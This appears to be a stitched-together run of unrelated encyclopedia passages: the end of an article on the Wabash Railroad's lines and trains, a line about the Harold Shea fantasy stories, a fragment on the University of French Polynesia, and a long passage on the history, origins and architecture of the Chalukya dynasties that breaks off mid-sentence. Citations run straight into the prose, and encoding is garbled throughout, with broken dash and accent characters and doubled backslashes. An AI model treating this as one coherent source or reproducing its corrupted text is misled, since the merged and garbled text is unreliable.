corridor. The stated intention was to gradually develop a trail. The report further stated that, though Montoff had the right as part of salvaging the rails to remove the bridges along the right of way, the cost to do so had been excessive. Instead, the deteriorated decks, which were sufficient for light duty use such as a trail, were being left. =Moberly‚ÄìDes Moines= The Moberly to Des Moines line consisted of the 15th & 16th Districts of the Moberly Division, with the dividing point between the two districts being Moulton, Iowa. The line had a good traffic base up until the early 1970s, when traffic began to fall off precipitously. Freight traffic included coal mined in Iowa (prior to 1960), agricultural goods, farm machinery, and paper products. A change of personnel in customer service at Des Moines brought about a resurgence in business in the late 1970s and into the 1980s ‚Äì so much so that NS largely re-built the line with newer, heavier steel and continuous welded rail in the mid-1980s. The Moberly to Des Moines line had few local industries shipping on it in the 1980s in either northern Missouri or southern Iowa, however, and served primarily as a \\"bridge\\" to get the NS to the Des Moines market. During the early 1990s, NS began to look for ways to save on track outlays and maintenance, and a deal was hammered out with the Burlington Northern (BN) to share access to Des Moines over the old Chicago, Burlington and Quincy (CBQ) \\"K Line\\" which paralleled the Mississippi River from Hannibal, Mo. north to Burlington, Iowa. From there, haulage rights were secured to Des Moines over the BN mainline to Albia, then northward to Des Moines on the old Albia joint trackage. A portion of the line north of Moulton was saved in order to provide access to the national rail system by the Appanoose County Community Railroad (APNC). The last carded NS train on the Moberly-Des Moines line ran in 1994. The Moberly to Moulton segment in Iowa was used extensively in 1993 during the Midwestern Floods of that year, as many observers noted that it was one of the few north‚Äìsouth through routes that were \\"above sea level\\" during the flooding. Unfortunately, this was not a factor that could have been used to save the line. Today the line's right-of- way has not been preserved, and as of 1997 the line was completely dismantled and is quickly being consumed by other land uses. Major Freight Customers 1960 Wabash box car assigned to the Studebaker plant in South Bend, Indiana. * Passenger trains Observation car of the St. Louis-Colorado Limited. The Wabash had a fleet of passenger trains, including several streamliners & domeliners: The first passenger trains to be dieselised used EMD E7 locomotives, and later ALCO PAs and EMD E8s. =Wabash Cannonball= The name of this legendary train became famous with the 1904 revision of an 1882 song about the \\"Great Rock Island Route.\\" Yet the name was never borne by a real train until the Wabash Railroad christened its Detroit-St. Louis day train as the Wabash Cannon Ball in 1949. The train survived until the creation of Amtrak in 1971, when it was discontinued. On October 26 and 27, 2013, Fort Wayne Railroad Historical Society's Nickel Plate Road 765, in conjunction with the Norfolk Southern Railway's \\"21st Century Steam\\" program, pulled a 225-mile round-trip excursion, retracing the Cannon Ball's former route between Fort Wayne and Lafayette, Indiana.  Heritage unit  As a part of Norfolk Southern's 30th anniversary in 2012, the company painted 20 new locomotives into predecessor schemes. NS #1070, an EMD SD70ACe locomotive, was painted into the Wabash \\"Blue Bird\\" paint scheme. Rail to trail Several portions of the old Wabash Railroad right-of-way have been converted to recreational use, including the Wabash Cannonball Trail in northwest Ohio, the Wabash Trail and Wauponsee Glacial Trail in Illinois and the Wabash Trace Nature Trail in Iowa.

The worlds are based on the mythologies, legends, and literary fantasies of our world. In the stories collected as The Incomplete Enchanter, the authors' protagonist Harold Shea visits two such worlds, that of Norse mythology and that of Edmund Spenser's The Faerie Queene.

History  Created by a decree of May 29, 1987, the university was originally called French Pacific University and was split between two sites, one located in New Caledonia (now University of New Caledonia) and the other in Tahiti. The administrative headquarters of the university was in Papeete. Both centers have become autonomous with the Decree No. 99-445 of 31 May 1999. The University of French Polynesia is based in Outumaoro, Punaauia, Tahiti. The number of students is growing steadily, with a significant increase of over 60% since 1999, and so has the range of course offerings. The University of French Polynesia is often the talk of local newspapers, especially because of its proactive policy for the employability of its graduates. One can mention, among others, the Employers' Forum, the sponsorship of class valedictorians by private companies, the Public Employment Fair, the innovative teaching methods developed by the academic community. = Presidents = Pierre Verin (1997-1999), president of the French Pacific University * Sylvie Andr√© (2001-2005), interim director between 1999 and 2000 * Louise Peltzer (2005-2011) * Eric Conte (2011 -)  Organization  The university is headed by the President, who has authority over all the staff.

During this period, they ruled as three related yet individual dynasties. The earliest dynasty, known as the \\"Badami Chalukyas\\", ruled from Vatapi (modern Badami) from the middle of the 6th century. The Badami Chalukyas began to assert their independence at the decline of the Kadamba kingdom of Banavasi and rapidly rose to prominence during the reign of Pulakeshin II. After the death of Pulakeshin II, the Eastern Chalukyas became an independent kingdom in the eastern Deccan. They ruled from Vengi until about the 11th century. In the western Deccan, the rise of the Rashtrakutas in the middle of the 8th century eclipsed the Chalukyas of Badami before being revived by their descendants, the Western Chalukyas, in the late 10th century. These Western Chalukyas ruled from Kalyani (modern Basavakalyan) until the end of the 12th century. The rule of the Chalukyas marks an important milestone in the history of South India and a golden age in the history of Karnataka. The political atmosphere in South India shifted from smaller kingdoms to large empires with the ascendancy of Badami Chalukyas. A Southern India-based kingdom took control and consolidated the entire region between the Kaveri and the Narmada rivers. The rise of this empire saw the birth of efficient administration, overseas trade and commerce and the development of new style of architecture called \\"Chalukyan architecture\\". Kannada literature, which had enjoyed royal support in the 9th century Rashtrakuta court found eager patronage from the Western Chalukyas in the Jain and Veerashaiva traditions. The 11th century saw the patronage of Telugu literature under the Eastern Chalukyas.  Origins  = Natives of Karnataka = Old Kannada inscription on victory pillar, Virupaksha Temple, Pattadakal, 733‚Äì745 CE While opinions vary regarding the early origins of the Chalukyas, the consensus among noted historians such as John Keay, D.C. Sircar, Hans Raj, S. Sen, Kamath, K. V. Ramesh and Karmarkar is that the founders of the empire at Badami were native to the modern Karnataka region.N. Laxminarayana Rao and Dr. S. C. Nandinath have claimed the Chalukyas were Kannadigas (Kannada speakers) and very much the natives of Karnataka (Kamath 2001, p. 57)The Chalukyas were Kannadigas (D.C. Sircar in Mahajan V.D., 1960, Reprint 2007, Ancient India, Chand and Company, New Delhi, p. 690, )Natives of Karnataka (Hans Raj, 2007, Advanced history of India: From earliest times to present times, Part-1, Surgeet publications, New Delhi, p. 339)The Chalukyas hailed from Karnataka (John Keay, 2000, p. 168)Quote:\\"They belonged to Karnataka country and their mother tongue was Kannada\\" (Sen 1999, p. 360)The Chalukyas of Badami seem to be of indigenous origin (Kamath 2001, p. 58)Jayasimha and Ranaraga, the first members of the Chalukya family were possibly employees of the Kadambas in the northern part of the Kadamba Kingdom (Fleet [in Kanarese Dynasties, p. 343] in Moraes, 1931, pp. 51‚Äì52)Pulakesi I must have been an administrative official of the northern Kadamba territory centered in Badami (Moraes 1931, pp. 51‚Äì52)The Chalukya base was Badami and Aihole (Thapar 2003, p. 328)Inscriptional evidence proves the Chalukyas were native Kannadigas (Karmarkar, 1947, p. 26) A theory that they were descendants of a 2nd-century chieftain called Kandachaliki Remmanaka, a feudatory of the Andhra Ikshvaku (from an Ikshvaku inscription of the 2nd century) was put forward. This according to Kamath has failed to explain the difference in lineage. The Kandachaliki feudatory call themselves Vashisthiputras of the Hiranyakagotra. The Chalukyas, however, address themselves as Harithiputras of Manavyasagotra in their inscriptions, which is the same lineage as their early overlords, the Kadambas of Banavasi. This makes them descendants of the Kadambas. The Chalukyas took control of the territory formerly ruled by the Kadambas.Pulakesi I of Badami who was a feudatory of the Kadamba king Krishna Varman II, overpowered his overlord in c. 540 and took control of the Kadamba Kingdom (Kamath 2001, p. 35) A later record of Eastern Chalukyas mentions the northern origin theory and claims one ruler of Ayodhya came south, defeated the Pallavas and married a Pallava princess. She had a child called Vijayaditya who is claimed to be the Pulakeshin I's father. However, according to the historians K. V. Ramesh, Chopra and Sastri, there are Badami Chalukya inscriptions that confirm Jayasimha was Pulakeshin I's grandfather and Ranaraga, his father.Jayasimha (Pulakesi I's grandfather) is known from the Kaira inscription of 472‚Äì473 CE. Both Jayasimha and Ranaraga (Pulakesi I's father) are known from Mahakuta inscription of 599 CE and Aihole record of 634 CE (Ramesh 1984, pp. 26‚Äì27, p. 30)From the Badami Cliff inscription of Pulakesi I and from the Hyderabad record of Pulakesi II which states their family ancestry (Kamath 2001, pp. 56‚Äì58)Sastri (1955), p. 154Chopra (2003), p. 73, part 1 Kamath and Moraes claim it was a popular practice in the 11th century to link South Indian royal family lineage to a Northern kingdom. The Badami Chalukya records themselves are silent with regards to the Ayodhya origin.Kamath (2001), p. 56Moraes (1931). pp. 10‚Äì11 While the northern origin theory has been dismissed by many historians, the epigraphist K. V. Ramesh has suggested that an earlier southern migration is a distinct possibility which needs examination.Ramesh (1984), p. 19 According to him, the complete absence of any inscriptional reference of their family connections to Ayodhya, and their subsequent Kannadiga identity may have been due to their earlier migration into present day Karnataka region where they achieved success as chieftains and kings. Hence, the place of origin of their ancestors may have been of no significance to the kings of the empire who may have considered themselves natives of the Kannada speaking region.Ramesh (1984), p. 20 The writing of 12th century Kashmiri poet Bilhana suggests the Chalukya family belonged to the Shudra caste while other sources claim they were Kshatriyas.Bilhana, in his Sanskrit work Vikramanakadevacharitam claims the Early Chalukya family were born from the feet of Hindu God Brahma, implying they were Shudras by caste, while other sources claim they were born in the arms of Brahma, and hence were Kshatriyas (Ramesh 1984, p. 15) The historians Jan Houben and Kamath, and the epigraphist D.C. Sircar note the Badami Chalukya inscriptions are in Kannada and Sanskrit.Sircar D.C. (1965), p. 48, Indian Epigraphy, Motilal Banarsidass Publishers, Delhi, Kamath (2001), p. 57Houben (1996), p. 215 According to the historian N. L. Rao, their inscriptions call them Karnatas and their names use indigenous Kannada titles such as Priyagallam and Noduttagelvom. The names of some Chalukya princes end with the pure Kannada term arasa (meaning \\"king\\" or \\"chief\\").Professor N.L. Rao has pointed out that some of their family records in Sanskrit have also named the princes with \\"arasa\\", such as Kattiyarasa (Kirtivarman I), Bittarasa (Kubja Vishnuvardhana) and Mangalarasa (Mangalesha, Kamath 2001, pp. 57‚Äì60)Historians Shafaat Ahmad Khan and S. Krishnasvami Aiyangar clarify that Arasa is Kannada word, equivalent to Sanskrit word Raja ‚Äì Journal of Indian History p. 102, Published by Department of Modern Indian History, University of Allahabad The Rashtrakuta inscriptions call the Chalukyas of Badami Karnatabala (\\"Power of Karnata\\"). It has been proposed by the historian S. C. Nandinath that the word \\"Chalukya\\" originated from Salki or Chalki which is a Kannada word for an agricultural implement.Dr. Hoernle suggests a non-Sanskrit origin of the dynastic name. Dr. S.C. Nandinath feels the Chalukyas were of agricultural background and of Kannada origin who later took up a martial career. He feels the word Chalki found in some of their records must have originated from salki, an agricultural implement (Kamath 2001, p. 57)The word Chalukya is derived from a Dravidian root (Kittel in Karmarkar 1947, p. 26) = Historical sources = Inscriptions in Sanskrit and Kannada are the main source of information about Badami Chalukya history. Among them, the Badami cave inscriptions of Mangalesha (578), Kappe Arabhatta record of c. 700, Peddavaduguru inscription of Pulakeshin II, the Kanchi Kailasanatha Temple inscription and Pattadakal Virupaksha Temple inscription of Vikramaditya II (all in Kannada language) provide more evidence of the Chalukya language.Kamath (2001), p. 6, p. 10, p. 57, p. 59, p. 67Ramesh (1984), p. 76, p. 159, pp. 161‚Äì162 The Badami cliff inscription of Pulakeshin I (543), the Mahakuta Pillar inscription of Mangalesha (595) and the Aihole inscription of Pulakeshin II (634) are examples of important Sanskrit inscriptions written in old Kannada script.Kamath (2001), p. 59 The reign of the Chalukyas saw the arrival of Kannada as the predominant language of inscriptions along with Sanskrit, in areas of the Indian peninsula outside what is known as Tamilaham (Tamil country).Thapar, (2003), p. 326 Several coins of the Badami Chalukyas with Kannada legends have been found. All this indicates that Kannada language flourished during this period.Kamath (2001), pp. 12, 57, 67 Travelogues of contemporary foreign travellers have provided useful information about the Chalukyan empire. The Chinese traveller Xuanzang had visited the court of Pulakeshin II. At the time of this visit, as mentioned in the Aihole record, Pulakeshin II had divided his empire into three Maharashtrakas or great provinces comprising 99,000 villages each. This empire possibly covered present day Karnataka, Maharashtra and coastal Konkan.Pulakesi II's Maharashtra extended from Nerbudda (Narmada river) in the north to Tungabhadra in the south (Vaidya 1924, p. 171)Kamath (2001), p. 60 Xuanzang, impressed with the governance of the empire observed that the benefits of the king's efficient administration was felt far and wide. Later, Persian emperor Khosrau II exchanged ambassadors with Pulakeshin II.From the notes of Arab traveller Tabari (Kamath 2001, p. 60)Chopra (2003), p. 75, part 1The Buddhist Caves at Aurangabad: Transformations in Art and Religion, Pia Brancaccio, BRILL, 2010 p.82 = Legends = Court poets of the Western Chalukya dynasty of Kalyani narrate: :\\"Once when Brahma, the creator, was engaged in the performance of the sandhya (twilight) rituals, Indra approached and beseeched him to create a hero who could put to an end the increasing evil on earth. On being thus requested, Brahma looked steadily into the Chuluka-jala (the water of oblation in his palm) and out sprang thence a great warrior, the progenitor of the Chalukyas\\".Ramesh (1984), p. 14 The Chalukyas claimed to have been nursed by the Sapta Matrikas (\\"seven divine mothers\\") and were worshippers of many gods including Siva, Vishnu, Chamundi, Surya, Kubera, Parvati, Vinayaka and Kartikeya. Some scholars connect the Chalukyas with the Chaulukyas (Solankis) of Gujarat. According to a myth mentioned in latter manuscripts of Prithviraj Raso, Chaulukyas were born out of fire-pit (Agnikund) at Mount Abu. However it has been reported that the story of Agnikula is not mentioned at all in the original version of the Prithviraj Raso preserved in the Fort Library at Bikaner. According to the Nilagunda inscription of King Vikramaditya VI (11th century or later), the Chalukyas originally hailed from Ayodhya where fifty- nine kings ruled, and later, sixteen more of this family ruled from South India where they had migrated. This is repeated by his court poet Bilhana, who claims that the first member of the family, \\"Chalukya\\", was so named as he was born in the \\"hollow of the hands\\" of God Brahma.Kamath 2001, pp. 56Quote:\\"Another unhistorical trend met with in the epigraphical records of the 11th and subsequent centuries is the attempt, on the part of the court poets, no doubt, again, with the consent of their masters, to invent mythical genealogies which seek to carry back the antiquity of the royal families not merely to the periods of the epics and the Vedas but to the very moment of their creation in the heavens. As far as the Chalukyas of Vatapi are concerned, the blame of engineering such travesties attaches, once again, to the Western Chalukyas of Kalyani and their Eastern Chalukya contemporaries. The Eastern Chalukyas, for instance, have concocted the following long list of fifty-two names commencing with no less a personage than the divine preserver\\"(Ramesh 1984, p. 16) Some genealogical accounts point to an Ayodhya origin and claim that the Chalukyas belonged to the Solar dynasty. According to a theory put forward by Lewis, the Chalukya were descendants of the \\"Seleukia\\" tribe of Iraq and that their conflict with the Pallava of Kanchi was, but a continuation of the conflict between ancient Seleukia and \\"Parthians\\", the proposed ancestors of Pallavas. However, this theory has been rejected by Kamath as it seeks to build lineages based simply on similar- sounding clan names.Dr. Lewis's theory has not found acceptance because the Pallavas were in constant conflict with the Kadambas, prior to the rise of Chalukyas (Kamath 2001, p. 57)  Periods in Chalukya history  The Chalukyas ruled over the Deccan plateau in India for over 600 years. During this period, they ruled as three closely related, but individual dynasties. These are the \\"Chalukyas of Badami\\" (also called \\"Early Chalukyas\\"), who ruled between the 6th and the 8th century, and the two sibling dynasties, the \\"Chalukyas of Kalyani\\" (also called Western Chalukyas or \\"Later Chalukyas\\") and the \\"Chalukyas of Vengi\\" (also called Eastern Chalukyas). = Chalukyas of Badami = Bhutanatha temple complex, at Badami In the 6th century, with the decline of the Gupta dynasty and their immediate successors in northern India, major changes began to happen in the area south of the Vindhyas ‚Äì the Deccan and Tamilaham. The age of small kingdoms had given way to large empires in this region.Thapar (2003), p. 326 The Chalukya dynasty was established by Pulakeshin I in 543.Popular theories regarding the name are: Puli ‚Äì \\"tiger\\" in Kannada and Kesin ‚Äì \\"haried\\" in Sanskrit; Pole ‚Äì \\"lustrous\\" in Kannada, from his earliest Badami cliff inscription that literally spells Polekesi; Pole ‚Äì from Tamil word Punai (to tie a knot; Ramesh 1984, pp. 31‚Äì32)The name probably meant \\"the great lion\\" (Sastri 1955, p. 134)The name probably meant \\"One endowed with the strength of a great lion\\" (Chopra 2003, p. 73, part 1) Pulakeshin I took Vatapi (modern Badami in Bagalkot district, Karnataka) under his control and made it his capital. Pulakeshin I and his descendants are referred to as \\"Chalukyas of Badami\\". They ruled over an empire that comprised the entire state of Karnataka and most of Andhra Pradesh in the Deccan. Pulakeshin II, whose pre-coronation name was Ereya,Kamath (2001), pp. 58‚Äì59 commanded control over the entire Deccan and is perhaps the most well-known emperor of the Badami dynasty.Ramesh (1984), p. 76Chopra 2003, p. 74, part 1 He is considered one of the notable kings in Indian history.Quote:\\"His fame spread far and wide even beyond India\\" (Chopra 2003, p. 75 part 1)Quote:\\"One of the great kings of India\\". He successfully defied the expansion of king Harshavardhana of Northern India into the deccan. The Aihole inscription by Ravikirti describes how King Harsha lost his Harsha or cheerful disposition after his defeat. The Chinese traveller Hiuen Tsiang also confirms Pulakesi II's victory over King Harsha in his travelogue. Pulakesi II took titles such as Prithvivallabha and Dakshinapatha Prithviswamy (Kamath 2001, pp. 58‚Äì60)Quote:\\"Thus began one of the most colourful careers in Indian History\\" (Ramesh 1984, p. 76) His queens were princess from the Alupa Dynasty of South Canara and the Western Ganga Dynasty of Talakad, clans with whom the Chalukyas maintained close family and marital relationships.Vikramaditya I, who later revived the Chalukya fortunes was born to Pulakesi II and the daughter of Western Ganga monarch Durvinita (Chopra 2003, p. 74, part 1)His other queen, an Alupa princess called Kadamba was the daughter of Aluka Maharaja (G.S. Gai in Kamath 2001, p. 94) Pulakeshin II extended the Chalukya Empire up to the northern extents of the Pallava kingdom and halted the southward march of Harsha by defeating him on the banks of the river Narmada. He then defeated the Vishnukundins in the south-eastern Deccan.Quote:\\"The Aihole record gives an impressive list of his military conquests and other achievements. According to the record, he conquered the Kadambas, the Western Gangas, the north Konkan by naval victory, Harsha of Thanesar, the Latas, the Malwas, the Gurjaras (thereby obtaining sovereignty over the Maharashtras), Berar, Maharashtra and Kuntala (with their nine and ninety thousand villages), the Kalingas and the Kosalas, Pishtapura (Pishtapuram in eastern Andhra) and Kanchipuram, whose king had opposed the rise of his power\\" (Chopra 2003, p. 74 part 1)Ramesh (1984), pp. 79‚Äì80, pp. 86‚Äì87According to Dr. R. C. Majumdar, some principalities may have submitted to Pulakesi II out of fear of Harsha of Kanauj (Kamath 2001, p. 59)Sastri (1955), pp. 135‚Äì136 Pallava Narasimhavarman however reversed this victory in 642 by attacking and occupying Badami temporarily. It is presumed Pulakeshin II, \\"the great hero\\", died fighting.Sastri (1955), p. 136 The Badami Chalukya dynasty went into a brief decline following the death of Pulakeshin II due to internal feuds when Badami was occupied by the Pallavas for a period of thirteen years.This is attested to by an inscription behind the Mallikarjuna temple in Badami (Sastri 1955, p. 136)Chopra (2003), pp. 75‚Äì76, part 1 It recovered during the reign of Vikramaditya I, who succeeded in pushing the Pallavas out of Badami and restoring order to the empire. Vikramaditya I took the title \\"Rajamalla\\" (lit \\"Sovereign of the Mallas\\" or Pallavas).From the Gadval plates dated c. 674 of Vikramaditya I (Chopra 2003, p. 76, part 1) The thirty-seven year rule of Vijayaditya (696‚Äì733) was a prosperous one and is known for prolific temple building activity.Chopra (2003), p. 76, part 1Sastri (1955), p. 138 The empire was its peak again during the rule of the illustrious Vikramaditya II (733‚Äì744) who is known not only for his repeated invasions of the territory of Tondaimandalam and his subsequent victories over Pallava Nandivarman II, but also for his benevolence towards the people and the monuments of Kanchipuram, the Pallava capital.From the Kannada inscription at the Kailasanatha temple in Kanchipuram (Sastri 1955, p. 140)Kamath (2001), p. 63 He thus avenged the earlier humiliation of the Chalukyas by the Pallavas and engraved a Kannada inscription on the victory pillar at the Kailasanatha Temple.Thapar (2003), p. 331Ramesh (1984), pp. 159‚Äì160 During his reign Arab intruders of the Umayyad Caliphate invaded southern Gujarat which was under Chalukya rule but the Arabs were defeated and driven out by Pulakesi, a Chalukya governor of Navsari.Dikshit, Durga Prasad (1980), p. 166‚Äì167, Political History of the ChƒÅlukyas of Badami, Abhinav Publications, New Delhi, OCLC 831387906 He later overran the other traditional kingdoms of Tamil country, the Pandyas, the Cholas and the Cheras in addition to subduing a Kalabhra ruler.Ramesh (1984), p. 159 The last Chalukya king, Kirtivarman II, was overthrown by the Rashtrakuta King Dantidurga in 753.Ramesh (1984), pp. 173‚Äì174 At their peak, the Chalukyas ruled a vast empire stretching from the Kaveri in the south to the Narmada in the north. = Chalukyas of Kalyani = The Chalukyas revived their fortunes in 973 after over 200 years of dormancy when much of the Deccan was under the rule of the Rashtrakutas. The genealogy of the kings of this empire is still debated. One theory, based on contemporary literary and inscriptional evidence plus the finding that the Western Chalukyas employed titles and names commonly used by the early Chalukyas, suggests that the Western Chalukya kings belonged to the same family line as the illustrious Badami Chalukya dynasty of the 6th centuryPoet Bilhanas 12th century Sanskrit work Vikramadeva Charitam and Ranna's Kannada work Gadayuddha (982) and inscriptions from Nilagunda, Yevvur, Kauthem and Miraj claim Tailapa II was son of Vikramaditya IV, seventh in descent from Bhima, brother of Badami Chalukya Vikramaditya II (Kamath 2001, p. 100)Kings of the Chalukya line of Vemulavada, who were certainly from the Badami Chalukya family line used the title \\"Malla\\" which is often used by the Western Chalukyas. Names such as \\"Satyashraya\\" which were used by the Badami Chalukya are also names of a Western Chalukya king, (Gopal B.R. in Kamath 2001, p. 100) while other Western Chalukya inscriptional evidence indicates they were a distinct line unrelated to the Early Chalukyas.Unlike the Badami Chalukyas, the Kalyani Chalukyas did not claim to be Harithiputhras of Manavysya gotra in lineage. The use of titles like Tribhuvanamalla marked them as of a distinct line (Fleet, Bhandarkar and Altekar in Kamath 2001, p. 100) Tailapa II, a Rashtrakuta feudatory ruling from Tardavadi ‚Äì 1000 (Bijapur district) overthrew Karka II, re-established the Chalukya rule in the western Deccan and recovered most of the Chalukya empire.Later legends and tradition hailed Tailapa as an incarnation of the God Krishna who fought 108 battles against the race of Ratta (Rashtrakuta) and captured 88 fortresses from them (Sastri 1955, p. 162)From his c. 957 and c.965 records (Kamath 2001, p. 101 The Western Chalukyas ruled for over 200 years and were in constant conflict with the Cholas, and with their cousins, the Eastern Chalukyas of Vengi. Vikramaditya VI is widely considered the most notable ruler of the dynasty.Vijnyaneshavara, the Sanskrit scholar in his court, eulogised him as \\"a king like none other\\" (Kamath 2001, p. 106)The writing Vikramankadevacharita by Bilhana is a eulogy of the achievements of the king in 18 cantos (Sastri, 1955 p. 315) Starting from the very beginning of his reign, which lasted fifty years, he abolished the original Saka era and established the Vikrama Era. Most subsequent Chalukya inscriptions are dated in this new era.Cousens 1926, p. 11Vikrama‚ÄìChalukya era of 1075 CE (Thapar 2003, p. 469) Vikramaditya VI was an ambitious and skilled military leader. Under his leadership the Western Chalukyas were able to end the Chola influence over Vengi (coastal Andhra) and become the dominant power in the Deccan.Chopra (2003), p. 139, part 1Sastri (1955), p. 175 The Western Chalukya period was an important age in the development of Kannada literature and Sanskrit literature.Kamath (2001), pp. 114‚Äì115Narasimhacharya (1988), pp. 18‚Äì20 They went into their final dissolution towards the end of the 12th century with the rise of the Hoysala Empire, the Pandyas, the Kakatiya and the Seuna Yadavas of Devagiri.Sastri (1955), p. 192 = Chalukyas of Vengi = Pulakeshin II conquered the eastern Deccan, corresponding to the coastal districts of modern Andhra Pradesh in 616, defeating the remnants of the Vishnukundina kingdom. He appointed his brother Kubja Vishnuvardhana as Viceroy in 621.Pulakesi II made Vishnuvardhana the Yuvaraja or crown prince. Later Vishnuvardhana become the founder of the Eastern Chalukya empire (Sastri 1955, pp. 134‚Äì136, p. 312)Chopra (2003), p. 132, part 1 Thus the Eastern Chalukyas were originally of Kannada stock.Kamath (2001), p. 8 After the death of Pulakeshin II, the Vengi Viceroyalty developed into an independent kingdom and included the region between Nellore and Visakhapatnam.Kamath 2001, p. 60 After the decline of the Badami Chalukya empire in the mid-8th century, territorial disputes flared up between the Rashtrakutas, the new rulers of the western deccan, and the Eastern Chalukyas. For much of the next two centuries, the Eastern Chalukyas had to accept subordination towards the Rashtrakutas.Chopra (2003), p. 133 Apart from a rare military success, such as the one by Vijayaditya II(c.808‚Äì847), it was only during the rule of Bhima I (c.892‚Äì921) that these Chalukyas were able to celebrate a measure of independence. After the death of Bhima I, the Andhra region once again saw succession disputes and interference in Vengi affairs by the Rashtrakutas. The fortunes of the Eastern Chalukyas took a turn around 1000. Danarnava, their king, was killed in battle in 973 by the Telugu Choda King Bhima who then imposed his rule over the region for twenty-seven years. During this time, Danarnava's two sons took refuge in the Chola kingdom. Choda Bhima's invasion of Tondaimandalam, a Chola territory, and his subsequent death on the battlefield opened up a new era in Chola‚ÄìChalukya relations. Saktivarman I, the elder son of Danarnava was crowned as the ruler of Vengi in 1000, though under the control of king Rajaraja Chola I.Sastri (1955), pp. 164‚Äì165 This new relationship between the Cholas and the coastal Andhra kingdom was unacceptable to the Western Chalukyas, who had by then replaced the Rashtrakutas as the main power in the western Deccan. The Western Chalukyas sought to brook the growing Chola influence in the Vengi region but were unsuccessful.Sastri (1955), p. 165 Initially, the Eastern Chalukyas had encouraged Kannada language and literature, though, after a period of time, local factors took over and they gave importance to Telugu language.Narasimhacharya (1988), p. 68The Eastern Chalukya inscriptions show a gradual shift towards Telugu with the appearance of Telugu stanzas from the time of king Gunaga Vijayaditya (Vijayaditya III) in the middle of the 9th century, Telugu literature owes its growth to the Eastern Chalukyas.The first work of Telugu literature is a translation of Mahabharata by Nannaya during the rule of Eastern Chalukya king Rajaraja Narendra (1019‚Äì1061; Sastri 1955, p. 367)  Architecture  Virupaksha temple in Dravidian style at Pattadakal, built 740 CE The Badami Chalukya era was an important period in the development of South Indian architecture. The kings of this dynasty were called Umapati Varlabdh and built many temples for the Hindu god Shiva.by Tartakov, Gary Michael (1997), The Durga Temple at Aihole: A Historiographical Study, Oxford University Press, Their style of architecture is called \\"Chalukyan architecture\\" or \\"Karnata Dravida architecture\\".Hardy (1995), p. 5Quote\\"The Badami Chalukyas had introduced a glorious chapter, alike in heroism in battle and cultural magnificence in peace, in the western Deccan\\" (K.V. Sounder Rajan in Kamath 2001, p. 68) Nearly a hundred monuments built by them, rock cut (cave) and structural, are found in the Malaprabha river basin in modern Bagalkot district of northern Karnataka.Kamath 2001, p. 68 The building material they used was a reddish-golden Sandstone found locally. These cave temples are basically excavations, cut out of the living rock sites they occupy. They were not built as their structural counterparts were, rather created by a special technique known as \\"subtraction\\" and are basically sculptural.Tarr, Gary (1970), p.156, Chronology and Development of the ChƒÅ·∏∑ukya Cave Temples, Ars Orientalis, Vol. 8, pp. 155‚Äì184 Though they ruled a vast empire, the Chalukyan workshops concentrated most of their temple building activity in a relatively small area within the Chalukyan heartland ‚Äì Aihole, Badami, Pattadakal and Mahakuta in modern Karnataka state.Hardy (1995), p. 65 Their temple building activity can be categorised into three phases. The early phase began in the last quarter of the 6th century and resulted in many cave temples, prominent among which are three elementary cave temples at Aihole (one Vedic, one Jain and one Buddhist which is incomplete), followed by four developed cave temples at Badami (of which cave 3, a Vaishnava temple, is dated accurately to 578 CE). These cave temples at Badami are similar, in that, each has a plain exterior but an exceptionally well finished interior consisting of a pillared verandah, a columned hall (mantapa) and a cella (shrine, cut deep into rock) which contains the deity of worship.Sastri (1955), p. 406 In Badami, three caves temples are Vedic and one in Jain. The Vedic temples contain large well sculpted images of Harihara, Mahishasuramardhini, Varaha, Narasimha, Trivikrama, Vishnu seated on Anantha (the snake) and Nataraja (dancing Shiva).Quote:\\"The Chalukyas cut rock like titans but finished like jewellers\\"(Sheshadri in Kamath 2001, pp. 68‚Äì69) The second phase of temple building was at Aihole (where some seventy structures exist and has been called \\"one of the cradles of Indian temple architecture\\"Percy Brown in Kamath (2001), p. 68) and Badami. Though the exact dating of these temples has been debated, there is consensus that the beginnings of these constructions are from c. 600.Sastri (1955), p. 407Hardy (1995), p. 67Foekema (2003), p. 11 These are the Lad Khan Temple (dated by some to c. 450 but more accurately to 620) with its interesting perforated stone windows and sculptures of river goddesses; the Meguti Jain Temple (634) which shows progress in structural design; the Durga Temple with its northern Indian style tower (8th century) and experiments to adapt a Buddhist Chaitya design to a brahminical one (its stylistic framework is overall a hybrid of north and south Indian styles.); the Huccimalli Gudi Temple with a new inclusion, a vestibule, connecting the sanctum to the hall.Sastri (1955), pp. 407‚Äì408 Other dravida style temples from this period are the Naganatha Temple at Nagaral; the Banantigudi Temple, the Mahakutesvara Temple and the Mallikarjuna Temple at Mahakuta; and the Lower Sivalaya Temple, the Malegitti Sivalaya Temple (upper) and the Jambulingesvara Temple at Badami. Located outside the Chalukyan architectural heartland, 140 km south-east of Badami, with a structure related to the Early Chalukya style is the unusual Parvati Temple at Sanduru which dates to the late 7th century. It is medium-sized, 48 ft long and 37 ft wide. It has a nagara (north Indian) style vimana (tower) and dravida (south Indian) style parts, has no mantapa (hall) and consists of an antarala (vestibule) crowned with a barrel-vaulted tower (sukhanasi). The \\"staggered\\" base plan of the temple became popular much later, in the 11th century.Carol Radcliffe Bolon, (1980) pp. 303‚Äì326, The PƒÅrvatƒ´ Temple, Sandur and Early Images of Agastya, Artibus Asiae Vol. 42, No. 4Hardy (1995), p.342, p.278 The structural temples at Pattadakal, built in the 8th century and now a UNESCO World Heritage Site, marks the culmination and mature phase of Badami Chalukyan architecture. The Bhutanatha group of temples at Badami are also from this period. There are ten temples at Pattadakal, six in southern dravida style and four in the northern nagara style. Well known among these are the Sangamesvara Temple (725), the Virupaksha Temple (740‚Äì745) and the Mallikarjuna Temple (740‚Äì745) in the southern style. The Papanatha temple (680) and Galaganatha Temple (740) are early attempts in the nagara ‚Äì dravida fusion style.Sastri (1955), p. 408 Inscriptional evidence suggests that the Virupaksha and the Mallikarjuna Temples were commissioned by the two queens of King Vikramaditya II after his military success over the Pallavas of Kanchipuram. Some well known names of Chalukyan architects are Revadi Ovajja, Narasobba and Anivarita Gunda.Kamath (2001), p. 69 The reign of Western Chalukyas was an important period in the development of Deccan architecture. Their architecture served as a conceptual link between the Badami Chalukya architecture of the 8th century and the Hoysala architecture popularised in the 13th century.Quote:\\"Their creations have the pride of place in Indian art tradition\\" (Kamath 2001, p. 115)Sastri (1955), p. 427 The centre of their cultural and temple-building activity lay in the Tungabhadra region of modern Karnataka state, encompassing the present-day Dharwad district; it included areas of present-day Haveri and Gadag districts.Cousens (1926, p 17Foekema (1996), p. 14 Here, large medieval workshops built numerous monuments.Hardy (1995), p. 156 These monuments, regional variants of pre-existing dravida 